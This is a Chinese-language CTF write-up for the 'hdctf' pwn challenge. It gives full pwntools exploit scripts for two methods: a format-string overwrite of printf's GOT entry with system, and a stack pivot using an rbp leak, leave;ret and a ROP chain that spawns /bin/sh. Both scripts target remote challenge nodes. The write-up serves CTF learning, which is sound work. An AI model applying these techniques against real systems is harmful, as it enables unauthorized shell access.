本题存在两种解法：  
`栈迁移`解法以及`格式化字符串`劫持printf_got。

主要的函数如下：

```
__int64 vuln()
{
  char s[80]; // [rsp+0h] [rbp-50h] BYREF

  memset(s, 0, sizeof(s));
  puts("please show me your name: ");
  read(0, s, 0x48uLL);
  printf("hello,");
  printf(s);
  puts("keep on !");
  read(0, s, 0x60uLL);
  return 0LL;
}
```



存在格式化字符串漏洞，使用fmtstr_payload可以替换`printf_got`为`system_plt`。

```
printf_got = elf.got['printf']
system_plt = elf.plt['system']

payload = fmtstr_payload(6, {printf_got: system_plt})
```

然后重新返回vuln函数，写入binsh即可getshell。  
完整EXP：

```
from PwnModules import *

#io = process('./hdctf')
io = remote('node4.anna.nssctf.cn', 28144)
elf = ELF('./hdctf')
context(arch='amd64', os='linux', log_level='debug')

io.recvuntil(b'name: \n')

printf_got = elf.got['printf']
system_plt = elf.plt['system']
vuln = elf.sym['vuln']

payload = fmtstr_payload(6, {printf_got: system_plt})
io.send(payload)

payload_ret = b'A' * (0x50 + 0x08) + p64(vuln)
io.recvuntil(b'keep on !\n')
io.send(payload_ret)
io.recvuntil(b'name: \n')
io.send(b'/bin/sh\x00')

io.interactive()
```


切记不能使用sendline，因为本题限制了Payload长度，而sendline会附加换行符，导致发送的Payload出现问题。

栈迁移解法：

```
from PwnModules import *

#io = process('./hdctf')
io = remote('node4.anna.nssctf.cn', 28031)
elf = ELF('./hdctf')
context(arch='amd64', os='linux', log_level='debug')

io.recvuntil(b'name: \n')

fmtpayload = b'%16$p'
io.send(fmtpayload)
io.recvuntil(b'hello,0x')

old_rbp = int(io.recv(12),16)

log.success('RBP Addr: ' + (hex(old_rbp)))

leave_ret = 0x4007F2
rdi = 0x4008D3
system = elf.plt['system']

Target_Addr = old_rbp - 0x60 - 0x08

# RDI will pop binsh addr as system's arg
# Offset : 0x08
Payload = p64(rdi)
# Offset : 0x08 + 0x08
Payload += p64(Target_Addr + 0x8 + 0x18)
# Offset : 0x08 + 0x10
Payload += p64(system)
# Offset : 0x08 + 0x18
Payload += b'/bin/sh\x00'
# Fill the Payload to 0x50.
Payload = Payload.ljust(0x50, b'a')
# The Leave Ret cmd's ret addr.
Payload += p64(Target_Addr)
# The Leave Ret
Payload += p64(leave_ret)

io.recvuntil(b'keep on !\n')
io.send(Payload)

io.interactive()
```



首先我们使用gdb动态调试获取rbp的偏移。  
![NSSIMAGE](https://www.nssctf.cn/files/2023/4/24/70c3624501.jpg)  
因此偏移就是16。  
使用%16$p获取rbp。  
![NSSIMAGE](https://www.nssctf.cn/files/2023/4/24/55bd430249.jpg)  
计算rbp与s的偏移。  
结果为0x60，因此我们需要将栈迁移到rbp - 0x60 - 0x08的位置。  
减去0x08是为了覆盖掉原先的返回地址。  
然后我们计算出/bin/sh的偏移，这正好是我的EXP中的注释写了的东西。  
写完之后就没什么好说的了，直接打就行了。